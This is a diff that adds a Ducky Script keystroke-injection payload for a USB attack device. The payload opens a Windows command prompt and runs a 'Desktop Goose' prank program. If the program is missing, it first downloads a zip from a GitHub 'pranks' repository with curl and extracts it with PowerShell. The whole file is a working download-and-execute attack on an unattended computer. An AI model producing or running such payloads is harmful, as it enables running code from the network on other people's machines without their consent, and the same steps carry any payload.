@@ -1,0 +1,28 @@
+DELAY 300
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 500
+STRING if exist "%USERPROFILE%\Downloads\DesktopGoose\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe" (
+ENTER
+DELAY 1000
+STRING start "" "%USERPROFILE%\Downloads\DesktopGoose\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 2000
+STRING ) else (
+ENTER
+DELAY 1000
+STRING curl -L "https://github.com/Madsky39/pranks/raw/refs/heads/main/DesktopGoose.zip" -o "%USERPROFILE%\Downloads\DesktopGoose.zip"
+ENTER
+DELAY 3000
+STRING powershell -Command "Expand-Archive '%USERPROFILE%\Downloads\DesktopGoose.zip' -DestinationPath '%USERPROFILE%\Downloads\DesktopGoose'"
+ENTER
+DELAY 3000
+STRING start "" "%USERPROFILE%\Downloads\DesktopGoose\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"
+ENTER
+STRING exit
+ENTER
